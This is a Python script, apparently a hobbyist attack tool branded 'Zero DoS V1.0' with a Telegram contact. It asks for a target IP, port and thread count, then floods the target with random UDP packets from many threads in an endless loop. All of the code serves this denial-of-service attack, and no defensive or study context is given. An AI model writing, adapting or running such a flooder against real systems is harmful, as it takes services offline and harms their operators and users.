from time import sleep
import socket
import threading
import os

def attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            packet_size = 1024
            sock.sendto(os.urandom(packet_size), (target_ip, target_port))
            print(f"\033[92mAttack sent to {target_ip}:{target_port} with packet size {packet_size} bytes\033[0m")
        except Exception as e:
            print(f"\033[91mError! {e}\033[0m")

def main():
    print("""
    \033[94m
    _____ (               ____       ____
|__  /___ _ __ ___   |  _ \  ___/ ___|
  / // _ \ '__/ _ \  | | | |/ _ \___ \
 / /|  __/ | | (_) | | |_| | (_) |__) |
/____\___|_|  \___/  |____/ \___/____/
  
    Zero DoS V1.0 | Telegram: @zeroexploits

Sorry for the target!
    \033[0m
    """)
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    thread_count = int(input("Enter thread count: "))
    print("\033[93mAttack is starting...\033[0m")
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)
        sleep(0.1)
    for thread in threads:
        thread.join()
    
    print("\033[92mAttack completed.\033[0m")

if __name__ == "__main__":
    main()
